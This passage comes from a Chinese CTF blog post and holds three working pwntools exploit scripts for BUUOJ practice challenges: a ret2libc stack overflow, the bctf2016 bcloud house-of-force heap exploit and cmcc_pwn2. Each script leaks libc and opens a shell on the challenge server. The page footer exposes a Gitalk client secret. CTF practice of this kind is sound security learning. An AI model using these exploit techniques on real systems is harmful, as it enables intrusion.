<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,28965)</span><br><span class="line">elf &#x3D; ELF(&quot;bof.dms&quot;)</span><br><span class="line">lib &#x3D; ELF(&quot;libc-2.23_x32.so&quot;)</span><br><span class="line">offset &#x3D; 112</span><br><span class="line">pop3_ret &#x3D; 0x08048629</span><br><span class="line">payload &#x3D; offset * b&quot;a&quot;</span><br><span class="line">payload +&#x3D; p32(elf.plt[&#39;write&#39;])</span><br><span class="line">payload +&#x3D; p32(pop3_ret)</span><br><span class="line">payload +&#x3D; p32(1)</span><br><span class="line">payload +&#x3D; p32(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">payload +&#x3D; p32(4)</span><br><span class="line">payload +&#x3D; p32(elf.symbols[&#39;main&#39;])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">libc &#x3D; u32(sh.recvuntil(&quot;\xf7&quot;)[-4:]) - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">binsh &#x3D;  libc + lib.search(b&#39;&#x2F;bin&#x2F;sh\x00&#39;).next()</span><br><span class="line">payload &#x3D; offset * b&quot;a&quot;</span><br><span class="line">payload +&#x3D; p32(system)</span><br><span class="line">payload +&#x3D; p32(0xdeadbeef)</span><br><span class="line">payload +&#x3D; p32(binsh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x99-bctf2016-bcloud">0x99 bctf2016_bcloud</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;bcloud_bctf_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	if size &gt; 0:</span><br><span class="line">		sh.recvuntil(&quot;:&quot;)</span><br><span class="line">		sh.send(content)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;bcloud_bctf_2016&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23_x32.so&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.send(&quot;b&quot; * 0x40)</span><br><span class="line">	sh.recvuntil(&quot;b&quot; * 0x40)</span><br><span class="line">	heap_base &#x3D; (u32(sh.recv(4)) &gt;&gt; 12) &lt;&lt; 12</span><br><span class="line">	topChunk &#x3D; heap_base + 0xd8</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.send(0x40 * &quot;a&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(&quot;\xff&quot; * 0x4)</span><br><span class="line">	notesize_addr &#x3D; 0x0804B0A0</span><br><span class="line">	notelist_addr &#x3D; 0x0804B120</span><br><span class="line">	add(notesize_addr - topChunk - 0x10,&#39;&#39;)</span><br><span class="line">	payload &#x3D; p32(0x400) * 10</span><br><span class="line">	payload &#x3D; payload.ljust(0x0804B120 - 0x0804B0A0,&#39;\x00&#39;)</span><br><span class="line">	payload +&#x3D; p32(elf.got[&#39;free&#39;])</span><br><span class="line">	payload +&#x3D; p32(notesize_addr)</span><br><span class="line">	payload +&#x3D; p32(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">	add(0x400,payload + &quot;\n&quot;)</span><br><span class="line">	edit(0,p32(elf.plt[&#39;puts&#39;]) + &quot;\n&quot;)</span><br><span class="line">	free(2)</span><br><span class="line">	__libc_start_main &#x3D; u32(sh.recvuntil(&#39;\xf7&#39;)[-4:])</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	edit(0,p32(system) + &quot;\n&quot;)</span><br><span class="line">	edit(1,payload + p32(binsh) + &quot;\n&quot;)</span><br><span class="line">	free(3)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,29792,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x100-cmcc-pwn2">0x100 cmcc_pwn2</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,25076)</span><br><span class="line">elf &#x3D; ELF(&quot;pwnme2&quot;)</span><br><span class="line">lib &#x3D; ELF(&quot;libc-2.23_x32.so&quot;)</span><br><span class="line">pop_ebp_ret &#x3D; 0x08048680</span><br><span class="line">offset &#x3D; 0x70</span><br><span class="line">payload &#x3D; offset * &quot;\xaa&quot;</span><br><span class="line">payload +&#x3D; p32(elf.plt[&#39;gets&#39;])</span><br><span class="line">payload +&#x3D; p32(pop_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(0x0804A060)</span><br><span class="line">payload +&#x3D; p32(0x080485CB)</span><br><span class="line">sh.sendlineafter(&quot;Please input:&quot;,payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline(&quot;&#x2F;flag&quot;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h1>感想：</h1>
<h3 id="2019年底了，我还是单身-ﾟДﾟ≡ﾟдﾟ-，一天天看着0202年的到来～～（划重点）">2019年底了，我还是单身(ﾟДﾟ≡ﾟдﾟ)!?，一天天看着0202年的到来～～（划重点）</h3>
<h3 id="啦啦啦-完结撒花-今年的任务算是完成了～-￣▽￣～">啦啦啦 完结撒花 今年的任务算是完成了～(￣▽￣～)</h3>
<h3 id="这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识-｀・ω・´">这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识(｀・ω・´)</h3>
<h3 id="祝BUUOJ越来越好！（￣▽￣）-赵总越来越rich">祝BUUOJ越来越好！（￣▽￣） 赵总越来越rich</h3>
<h1>南梦小剧场：</h1>
<h3 id="神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←-←">神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←_←</h3>
<h3 id="南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？-´；ω；-100个EXP，瞧瞧这是人说的话吗？）">南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？ (´；ω；`) 100个EXP，瞧瞧这是人说的话吗？）</h3>
<h3 id="神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？">神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？</h3>
<h3 id="南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）">南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）</h3>
<h1>更新与维护</h1>
<h3 id="后续可能会进一步更新x64和x32的解法（如果存在解的话）">后续可能会进一步更新x64和x32的解法（如果存在解的话）</h3>
<h3 id="EXP解释之后可能会进一步完善（-就看我有没有女朋友了-°∀°-ﾉ-）">EXP解释之后可能会进一步完善（ 就看我有没有女朋友了(°∀°)ﾉ ）</h3>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:196011564@qq.com">咲夜南梦</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/">http://yoursite.com/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com" target="_blank">咲夜南梦's 博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF    </a><a class="post-meta__tags" href="/tags/Pwn/">Pwn    </a></div><div class="post_share"><div class="social-share" data-image="/2020/03/22/Vue-入门/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/alipay.jpg" alt="支付宝"/><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/07/15/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-19%E5%B9%B47%E6%9C%88%E8%B5%9B/"><img class="prev_cover lazyload" data-src="/2019/07/15/CTF-安恒杯-19年7月赛/bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTF-安恒杯-19年7月赛</div></div></a></div><div class="next-post pull_right"><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/"><img class="next_cover lazyload" data-src="/2019/07/09/CTF-赛博杯CyberCTF-19年7月/bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF-赛博杯CyberCTF-19年7月</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2018/12/07/CTF-JarvisOJ-Basic-ROPGadget/" title="CTF-JarvisOJ-Basic-ROPGadget"><img class="relatedPosts_cover lazyload"data-src="/2018/12/07/CTF-JarvisOJ-Basic-ROPGadget/2.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2018-12-07</div><div class="relatedPosts_title">CTF-JarvisOJ-Basic-ROPGadget</div></div></a></div><div class="relatedPosts_item"><a href="/2018/11/27/CTF-JarvisOJ-Basic-Shellcode/" title="CTF-JarvisOJ-Basic-Shellcode"><img class="relatedPosts_cover lazyload"data-src="/2018/11/27/CTF-JarvisOJ-Basic-Shellcode/2.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2018-11-27</div><div class="relatedPosts_title">CTF-JarvisOJ-Basic-Shellcode</div></div></a></div><div class="relatedPosts_item"><a href="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/" title="CTF-JarvisOJ-Pwn-[61dctf]fm"><img class="relatedPosts_cover lazyload"data-src="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/5.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2018-12-12</div><div class="relatedPosts_title">CTF-JarvisOJ-Pwn-[61dctf]fm</div></div></a></div><div class="relatedPosts_item"><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/" title="CTF-JarvisOJ-Pwn-[XMAN]level0"><img class="relatedPosts_cover lazyload"data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/9.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2018-11-30</div><div class="relatedPosts_title">CTF-JarvisOJ-Pwn-[XMAN]level0</div></div></a></div><div class="relatedPosts_item"><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/" title="CTF-JarvisOJ-Pwn-[XMAN]level1"><img class="relatedPosts_cover lazyload"data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/7.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2018-11-30</div><div class="relatedPosts_title">CTF-JarvisOJ-Pwn-[XMAN]level1</div></div></a></div><div class="relatedPosts_item"><a href="/2019/04/14/CTF-JarvisOJ-Pwn-[XMAN]level3_x64/" title="CTF-JarvisOJ-Pwn-[XMAN]level3_x64"><img class="relatedPosts_cover lazyload"data-src="/2019/04/14/CTF-JarvisOJ-Pwn-[XMAN]level3_x64/1.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-04-14</div><div class="relatedPosts_title">CTF-JarvisOJ-Pwn-[XMAN]level3_x64</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '560d606afb5e3201949f',
  clientSecret: 'adf278d9baa268981569ab6db3020b28d99f2aec',
  repo: '196011564.github.io',
  owner: '196011564',
  admin: ['196011564'],
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN',
  perPage: 10,
  distractionFreeMode: false,
  pagerDirection: 'last',
  createIssueManually: false,
  updateCountCallback: commentCount
})
gitalk.render('gitalk-container')

function commentCount(n){
  try {
    document.getElementsByClassName('gitalk-comment-count')[0].innerHTML= n
  } catch (e) {
    return false
  }
}</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By 咲夜南梦</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="/js/search/local-search.js"></script></body></html>